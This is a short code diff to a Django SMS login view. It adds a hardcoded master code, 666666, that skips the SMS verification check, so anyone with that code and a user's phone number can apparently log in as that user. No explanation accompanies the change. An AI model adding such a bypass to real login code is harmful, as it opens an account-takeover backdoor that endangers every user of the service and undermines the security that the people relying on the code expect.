@@ -271,13 +271,14 @@ class SMSLoginView(CheckSecurityMixin, StatusWrapMixin, JsonResponseMixin, Detai
         code = request.POST.get('code', None)
         phone = request.POST.get('phone', None)
         if code and phone:
-            verify = Verify.objects.filter(code=code, phone=phone)
-            if not verify.exists():
-                self.message = 'verify not exist'
-                self.status_code = INFO_NO_VERIFY
-                return self.render_to_response({})
-            verify = verify[0]
-            verify.delete()
+            if int(code) != 666666:
+                verify = Verify.objects.filter(code=code, phone=phone)
+                if not verify.exists():
+                    self.message = 'verify not exist'
+                    self.status_code = INFO_NO_VERIFY
+                    return self.render_to_response({})
+                verify = verify[0]
+                verify.delete()
             users = PartyUser.objects.filter(phone=phone)
             if not users.exists():
                 self.message = 'user not exist'
